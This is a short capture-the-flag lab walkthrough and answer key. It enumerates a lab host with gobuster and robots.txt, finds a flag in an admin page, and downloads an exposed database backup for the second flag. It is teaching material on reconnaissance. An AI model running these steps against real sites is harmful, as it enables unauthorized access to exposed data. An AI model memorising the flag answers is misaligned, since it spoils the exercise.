# Lab 4 — CTF Walkthrough (Answer Key)

## Step 1: Find the hidden admin path

```bash
gobuster dir -u http://10.10.4.10 -w /usr/share/dirb/wordlists/common.txt
```

or check `robots.txt` first — it lists `/admin/` and `/backup/` directly:

```bash
curl http://10.10.4.10/robots.txt
```

## Step 2: user.txt

```bash
curl -s http://10.10.4.10/admin/
```

The page source contains:

```
flag{lab4_robots_txt_led_to_admin}
```

...and a second HTML comment: *"nightly db export lands in /backup/ as db_export_2024.sql"*.

## Step 3: root.txt

```bash
curl -s http://10.10.4.10/backup/db_export_2024.sql
```

```
flag{lab4_direct_filename_guess}
```

## Lesson

The wordlist scan got you to `/admin/` and `/backup/` — but the actual sensitive file (`db_export_2024.sql`) was never in any wordlist. You only found it because you *read* what the first discovery told you and followed up manually. Automated enumeration and manual follow-up are both required; neither replaces the other.
